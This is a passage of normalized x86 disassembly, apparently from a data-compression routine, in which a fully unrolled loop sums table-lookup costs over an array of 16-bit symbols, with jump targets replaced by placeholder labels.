mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x64 ]
imul edx edx 0x102
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0x9324 ]
push ecx
mov edx [ ebp - 0x64 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0x9930 ]
push ecx
call sub_413fa0
add esp 0x14
jmp r-xdata
push 0xbbd
call sub_4057d5
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x64 ]
imul edx edx 0x102
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0x9324 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x64 ]
add eax 0x1
mov [ ebp - 0x64 ] eax
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x50 ]
jg r-xdata
mov [ ebp - 0x84 ] 0x0
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x88 ] eax
mov ecx [ ebp - 0x88 ]
mov [ ebp - 0x80 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x2 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x4 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x6 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x8 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0xa ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0xc ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0xe ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x10 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x12 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x14 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x16 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x18 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x1a ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x1c ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x1e ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x20 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x22 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x24 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x26 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x28 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x2a ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x2c ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x2e ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x30 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x32 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x34 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x36 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x38 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x3a ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x3c ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x3e ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x40 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x42 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x44 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x46 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x48 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
